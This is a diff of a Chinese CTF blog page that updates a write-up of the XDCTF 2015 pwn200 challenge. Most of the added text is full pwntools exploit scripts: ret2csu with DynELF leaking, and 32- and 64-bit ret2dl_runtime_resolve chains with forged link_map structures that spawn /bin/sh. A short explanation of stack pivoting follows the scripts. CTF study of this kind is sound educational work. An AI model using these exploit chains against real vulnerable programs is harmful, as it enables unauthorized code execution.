@@ -410,21 +410,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-04-17
+                    2023-04-25
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    2.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    13 分
                 </div>
                 
 
@@ -576,10 +576,10 @@ csu(0, 1, read_got, 8, bss_addr, 0, main_addr)
 #执行read(0,bss_addr,8)后，执行main_addr
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+
 <h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="2.解题思路"></a>2.解题思路</h2><p>checksec下32位，除了canary没开，其他保护全开。</p>
 <p>借助DynELF实现利用的点：<br>1）调用write函数来泄露地址信息，比较方便；<br>2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；<br>3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；<br>4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。</p>
-<p>exp:</p>
-<pre class="line-numbers language-none"><code class="language-none">from pwn import *
+<h3 id="dynelf-exp-32位）"><a href="#dynelf-exp-32位）" class="headerlink" title="dynelf exp(32位）"></a>dynelf exp(32位）</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
 
 p &#x3D; process(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)
 elf &#x3D; ELF(&quot;.&#x2F;XDCTF_2015_pwn200&quot;)
@@ -617,9 +617,213 @@ p.send(payload3)
 p.send(&#39;&#x2F;bin&#x2F;sh&#39;)
 p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="万能pop模板-dynelf-exp（64位）"><a href="#万能pop模板-dynelf-exp（64位）" class="headerlink" title="万能pop模板+dynelf exp（64位）"></a>万能pop模板+dynelf exp（64位）</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
 
-<h1 id="二-ret2-dl-runtime-resolve方法"><a href="#二-ret2-dl-runtime-resolve方法" class="headerlink" title="二.ret2_dl_runtime_resolve方法"></a>二.ret2_dl_runtime_resolve方法</h1><p>参考：<br><a target="_blank" rel="noopener" href="https://ctf-wiki.org/executable/elf/structure/basic-info/">https://ctf-wiki.org/executable/elf/structure/basic-info/</a><br><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502</a><br><a target="_blank" rel="noopener" href="https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL">https://www.yuque.com/hxfqg9/bin/ug9gx5#5dvaL</a></p>
-<h2 id="1-基本知识"><a href="#1-基本知识" class="headerlink" title="1.基本知识"></a>1.基本知识</h2><h3 id="1-1Linux动态链接"><a href="#1-1Linux动态链接" class="headerlink" title="1.1Linux动态链接"></a>1.1Linux动态链接</h3><p>参考我的另一篇博客，<a href="http://tcrestart.github.io/2023/04/16/linux-dong-tai-lian-jie/">Linux动态链接</a></p>
+p&#x3D;process(&#39;.&#x2F;main_partial_relro_64&#39;)
+elf&#x3D;ELF(&#39;.&#x2F;main_partial_relro_64&#39;)
+#context(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;)
+write_got&#x3D;elf.got[&#39;write&#39;]
+read_got&#x3D;elf.got[&#39;read&#39;]
+main_addr&#x3D;0x40066E
+fun_addr&#x3D;0x400637 
+bss_addr&#x3D;0x601050+0x200
+
+csu_front_addr&#x3D;0x000000000400780
+csu_end_addr&#x3D;0x00000000040079A 
+print(&quot;write_got &gt;&gt; &quot;+hex(write_got))
+
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    payload &#x3D; b&#39;a&#39;*0x70 + b&#39;b&#39;*0x8
+    payload +&#x3D; p64(csu_end_addr) 
+    payload +&#x3D; p64(rbx) + p64(rbp)+p64(r12) +p64(r13)+p64(r14)+p64(r15)
+    payload +&#x3D; p64(csu_front_addr)
+    payload +&#x3D; b&#39;a&#39; * 0x38	
+    payload +&#x3D; p64(last)
+    p.send(payload)
+    sleep(1)
+
+def leak(addr):
+	p.recvuntil(&quot;Welcome to XDCTF2015~!\n&quot;)
+	csu(0, 1, write_got, 1, addr, 8, main_addr)
+	data&#x3D;p.recv(8)
+	log.info(&quot;%#x &#x3D;&gt; %s&quot; % (addr, (data or &#39;&#39;).encode(&#39;hex&#39;))) 
+	return data
+		
+d&#x3D;DynELF(leak,elf&#x3D;elf)
+
+execve_addr&#x3D;d.lookup(&#39;execve&#39;,&#39;libc&#39;)
+print(&quot;execve_addr: &quot;+hex(execve_addr))
+
+payload&#x3D;p64(execve_addr)+b&#39;&#x2F;bin&#x2F;sh&#39;
+csu(0, 1, read_got, 0, bss_addr, len(payload), main_addr)
+p.send(payload)
+
+csu(0, 1, bss_addr, bss_addr+8, 0, 0, main_addr)
+
+p.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">原文</a></p>
+<h1 id="二-ret2-dl-runtime-resolve方法"><a href="#二-ret2-dl-runtime-resolve方法" class="headerlink" title="二.ret2_dl_runtime_resolve方法"></a>二.ret2_dl_runtime_resolve方法</h1><blockquote>
+<p>详参：<br><a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/107378159?spm=1001.2014.3001.5502">holly</a><br><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2021/12/23/dl-runtime-resolve%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">yhello</a></p>
+</blockquote>
+<h2 id="exp-（32位）"><a href="#exp-（32位）" class="headerlink" title="exp:（32位）"></a>exp:（32位）</h2><pre class="line-numbers language-none"><code class="language-none">from pwn import *
+elf &#x3D; ELF(&#39;main&#39;)
+r &#x3D; process(&#39;.&#x2F;main&#39;)
+rop &#x3D; ROP(&#39;.&#x2F;main&#39;)
+
+offset &#x3D; 112
+bss_addr &#x3D; elf.bss() #获取bss段首地址
+
+r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)
+
+## 将栈迁移到bss段
+## 新栈空间大小为0x800
+stack_size &#x3D; 0x800
+base_stage &#x3D; bss_addr + stack_size 
+### 填充缓冲区
+rop.raw(&#39;a&#39; * offset) 
+### 向新栈中写100个字节
+##rop.read会自动完成read函数、函数参数、返回地址的栈部署
+rop.read(0, base_stage, 100)
+### 栈迁移, 设置esp &#x3D; base_stage
+##rop.migrate会利用leave_ret自动部署迁移工作
+rop.migrate(base_stage)
+r.sendline(rop.chain())
+
+# &quot;&#x2F;bin&#x2F;sh&quot;字符串
+rop &#x3D; ROP(&#39;.&#x2F;main&#39;)
+sh &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;
+
+#获取plt0的基地址
+plt0 &#x3D; elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr
+#获取.rel.plt的基地址
+rel_plt &#x3D; elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr
+#获取.dynsym的基地址
+dynsym &#x3D; elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr
+#获取.dynstr的基地址
+dynstr &#x3D; elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr
+
+## 在base_stage + 32的地方开始部署.dynsym结构体
+fake_sym_addr &#x3D; base_stage + 32
+## 对齐
+align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)
+fake_sym_addr &#x3D; fake_sym_addr + align
+## 计算.dynsym结构体下标
+index_dynsym &#x3D; (fake_sym_addr - dynsym) &#x2F; 0x10
+## 计算.dynstr偏移准备更改.dynsym成员变量st_name
+st_name &#x3D; fake_sym_addr + 0x10 - dynstr
+fake_write_sym &#x3D; flat([st_name, 0, 0, 0x12])# 伪造的.dynsym结构体
+
+# 在 base_stage+24的位置开始部署.rel.plt的结构体
+index_offset &#x3D; base_stage + 24 - rel_plt
+write_got &#x3D; elf.got[&#39;write&#39;]
+# 由.dynsym结构体下标反推r_info
+r_info &#x3D; (index_dynsym &lt;&lt; 8) | 0x7
+fake_write_reloc &#x3D; flat([write_got, r_info])
+
+rop.raw(plt0)
+rop.raw(index_offset)
+# fake ret addr of write
+rop.raw(&#39;bbbb&#39;) #system函数返回地址
+rop.raw(base_stage + 82) #system函数1参
+rop.raw(&#39;bbbb&#39;) #原write函数2参
+rop.raw(&#39;bbbb&#39;) #原write函数3参
+rop.raw(fake_write_reloc)  # 伪造的.rel.plt的结构体
+rop.raw(&#39;a&#39; * align)  # 对齐
+rop.raw(fake_write_sym)  # 伪造的.dynsym的结构体
+rop.raw(&#39;system\x00&#39;) #伪造的.dynstr
+rop.raw(&#39;a&#39; * (80 - len(rop.chain())))
+rop.raw(sh)
+rop.raw(&#39;a&#39; * (100 - len(rop.chain())))
+#print rop.dump() 可打印栈布局
+r.sendline(rop.chain())
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="基于模板的exp（64位）"><a href="#基于模板的exp（64位）" class="headerlink" title="基于模板的exp（64位）"></a>基于模板的exp（64位）</h2><p>如果题目中给出了libc版本，就可以用这个方法（泄露出libc版本后也行）</p>
+<pre class="line-numbers language-none"><code class="language-none">from pwn import *  
+context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;amd64&#39;,log_level&#x3D;&#39;debug&#39;)
+
+r &#x3D; process(&#39;.&#x2F;main_partial_relro_64&#39;)  
+elf &#x3D; ELF(&#39;.&#x2F;main_partial_relro_64&#39;)  
+libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.31.so&#39;) #程序使用这个库文件
+read_plt &#x3D; elf.plt[&#39;read&#39;]  
+write_got &#x3D; elf.got[&#39;write&#39;]  
+vuln_addr &#x3D; elf.sym[&#39;vuln&#39;]  
+  
+bss &#x3D; 0x601050  
+bss_stage &#x3D; bss + 0x100
+l_addr &#x3D;  libc.sym[&#39;system&#39;] -libc.sym[&#39;write&#39;]  
+#目标函数和已知函数的偏移（把‘write’重定位成‘system’）
+  
+pop_rdi &#x3D; 0x4007a3  
+pop_rsi &#x3D; 0x4007a1 
+plt_load &#x3D; 0x400506 #plt[1](dl_runtime_resolve)
+
+def fake_Linkmap_payload(fake_linkmap_addr,known_func_ptr,offset):
+    #offset为负数，可以用‘(2 ** 64 - 1)’来控制范围 
+    linkmap &#x3D; p64(offset &amp; (2 ** 64 - 1))
+    linkmap +&#x3D; p64(0) 
+    linkmap +&#x3D; p64(fake_linkmap_addr + 0x18)
+    linkmap +&#x3D; p64((fake_linkmap_addr + 0x30 - offset) &amp; (2 ** 64 - 1)) 
+    linkmap +&#x3D; p64(0x7) 
+    linkmap +&#x3D; p64(0)
+    linkmap +&#x3D; p64(0)
+    linkmap +&#x3D; p64(0)
+    linkmap +&#x3D; p64(known_func_ptr - 0x8) 
+    linkmap +&#x3D; b&#39;&#x2F;bin&#x2F;sh\x00&#39;
+    linkmap &#x3D; linkmap.ljust(0x68,b&#39;A&#39;)
+    linkmap +&#x3D; p64(fake_linkmap_addr) 
+    linkmap +&#x3D; p64(fake_linkmap_addr + 0x38) 
+    linkmap &#x3D; linkmap.ljust(0xf8,b&#39;A&#39;)
+    linkmap +&#x3D; p64(fake_linkmap_addr + 0x8)
+    return linkmap
+
+#fake_linkmap_addr：可以控制的地址
+#known_func_ptr：function_got（已知函数的GOT表地址）
+#offset：system_got - function_got
+
+fake_link_map &#x3D; fake_Linkmap_payload(bss_stage, write_got ,l_addr)
+payload &#x3D; flat( &#39;a&#39; * 120 ,pop_rdi, 0 , pop_rsi , bss_stage , 0 , read_plt , pop_rsi , 0 ,0 , pop_rdi , bss_stage + 0x48  , plt_load , bss_stage , 0 )
+
+&quot;&quot;&quot;
+read_plt触发时输入‘fake_link_map’，plt_load就是dl_runtime_resolve，控制程序手段执行dl_runtime_resolve，此时‘bss_stage’被当做第一个参数，‘0’被当做第二个参数
+&quot;&quot;&quot;
+
+r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)  
+r.sendline(payload)  
+
+r.send(fake_link_map) #把write重定位为system
+
+r.interactive()
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="https://ywhkkx.github.io/2022/01/03/%E4%B8%87%E8%83%BDpop+DynELF%E7%BB%8F%E5%85%B8%E7%BB%84%E5%90%88/">原文</a></p>
+<p>&#x2F;&#x2F;PS:</p>
+<blockquote>
+<p>为什么程序会调用“aaaa”呢？</p>
+</blockquote>
+<pre class="line-numbers language-none"><code class="language-none">stack_size &#x3D; 0x800
+base_stage &#x3D; bss_addr + stack_size 
+rop.raw(&#39;a&#39; * offset) 
+rop.read(0, base_stage, 100)
+rop.migrate(base_stage)
+
+***等价于***
+
+payload &#x3D; &#39;a&#39;*offset
+payload +&#x3D; base_stage
+payload +&#x3D; read_plt
+payload +&#x3D; leave_ret
+payload +&#x3D; p32(0) + p32(base_stage) +p32(100)
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>read_plt执行过程中，会输入新的payload到bss_stage中，执行结束后会返回leave_ret<br>这里的关键就是leave_ret，汇编语言leave本身会“pop ebp”一次，然后ret又一次“pop”控制ip指针<br>1.leave把bss_stage变为新的ebp，然后重置sp指针，这时bss_stage就是新的栈了<br>2.ret则会把新的栈中的栈顶弹入ip指针<br>而read_plt已经提前在它之中写入了数据：（节选）</p>
+<pre class="line-numbers language-none"><code class="language-none">rop.raw(plt0)
+rop.raw(index_offset)
+# fake ret addr of write
+rop.raw(&#39;bbbb&#39;) #system函数返回地址
+rop.raw(base_stage + 82) #system函数1参<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>所以指令ret会把 ‘aaaa’ 弹到ip寄存器中，而程序没法识别 ‘aaaa’ ，所以会把它当成一个新的函数，然后会调用 ret2dlresolve 去尝试重定位这个函数，这时伪装就成功了</p>
 
                 
             </div>
@@ -908,7 +1112,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h1, h2, h3, h4, h5'
+            headingSelector: 'h1, h2, h3, h4, h5，h6'
         });
 
         // Set scroll toc fixed.
@@ -1043,7 +1247,7 @@ p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">6.9k</span>
+                        class="white-color">13.5k</span>
             
             
             
